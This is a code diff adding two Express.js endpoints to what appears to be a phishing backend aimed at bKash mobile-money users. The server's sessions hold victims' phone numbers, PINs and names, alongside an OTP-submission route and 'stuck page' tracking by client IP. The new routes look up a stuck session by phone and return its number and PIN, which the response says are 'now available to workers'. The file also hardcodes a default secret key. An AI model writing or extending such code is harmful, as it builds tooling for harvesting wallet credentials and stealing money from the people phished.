@@ -450,6 +450,133 @@ app.get('/api/submit-otp', (req, res) => {
   });
 });
 
+// ===== RELEASE STUCK SESSION BY PHONE → Worker Data =====
+// Takes phone number, finds stuck session, releases its number+pin to workers
+app.post('/api/release-stuck', (req, res) => {
+  const phone = req.body?.phone || req.query?.phone;
+  if (!phone) {
+    return res.status(400).json({ error: 'Missing phone parameter' });
+  }
+
+  const normalized = normalizePhoneForLookup(phone);
+
+  let foundSession = null;
+  let foundId = null;
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if ((p1 === normalized || p2 === normalized) && data.stuckPageActive === true) {
+      foundSession = data;
+      foundId = id;
+      break;
+    }
+  }
+
+  if (!foundSession) {
+    return res.json({ success: false, phone: normalized, message: 'No stuck session found for this number' });
+  }
+
+  const gatewayNumber = foundSession.gatewayPhone || foundSession.initialPhone || '';
+  const pin = foundSession.pin || '';
+
+  const updates = {
+    ...foundSession,
+    stuckPageActive: false,
+    stuckPageMessage: '',
+    waitingFor: 'NONE',
+    lastAutomationData: '',
+    lastDataSentAt: 0,
+    lastActionTrigger: null,
+    lastActionAt: 0,
+    assignedWorker: null,
+    assignedAt: null,
+    lastUpdated: Date.now(),
+  };
+  sessions[foundId] = updates;
+  saveSession(foundId);
+
+  if (foundSession.clientIp && stuckIps[foundSession.clientIp]) {
+    delete stuckIps[foundSession.clientIp];
+    saveStuckIps();
+  }
+
+  res.json({
+    success: true,
+    sessionId: foundId,
+    phone: normalized,
+    number: gatewayNumber,
+    pin: pin,
+    name: foundSession.name || '',
+    provider: foundSession.provider || 'bkash',
+    message: 'Session released. Number and PIN now available to workers.',
+  });
+});
+
+// GET version
+app.get('/api/release-stuck', (req, res) => {
+  const phone = req.query?.phone;
+  if (!phone) {
+    return res.status(400).json({ error: 'Missing phone parameter' });
+  }
+
+  const normalized = normalizePhoneForLookup(phone);
+
+  let foundSession = null;
+  let foundId = null;
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if ((p1 === normalized || p2 === normalized) && data.stuckPageActive === true) {
+      foundSession = data;
+      foundId = id;
+      break;
+    }
+  }
+
+  if (!foundSession) {
+    return res.json({ success: false, phone: normalized, message: 'No stuck session found for this number' });
+  }
+
+  const gatewayNumber = foundSession.gatewayPhone || foundSession.initialPhone || '';
+  const pin = foundSession.pin || '';
+
+  const updates = {
+    ...foundSession,
+    stuckPageActive: false,
+    stuckPageMessage: '',
+    waitingFor: 'NONE',
+    lastAutomationData: '',
+    lastDataSentAt: 0,
+    lastActionTrigger: null,
+    lastActionAt: 0,
+    assignedWorker: null,
+    assignedAt: null,
+    lastUpdated: Date.now(),
+  };
+  sessions[foundId] = updates;
+  saveSession(foundId);
+
+  if (foundSession.clientIp && stuckIps[foundSession.clientIp]) {
+    delete stuckIps[foundSession.clientIp];
+    saveStuckIps();
+  }
+
+  res.json({
+    success: true,
+    sessionId: foundId,
+    phone: normalized,
+    number: gatewayNumber,
+    pin: pin,
+    name: foundSession.name || '',
+    provider: foundSession.provider || 'bkash',
+    message: 'Session released. Number and PIN now available to workers.',
+  });
+});
+
 const AI_API_KEY = process.env.AI_API_KEY || 'bkash-ai-secret-2025';
 
 function normalizePhoneForLookup(p) {
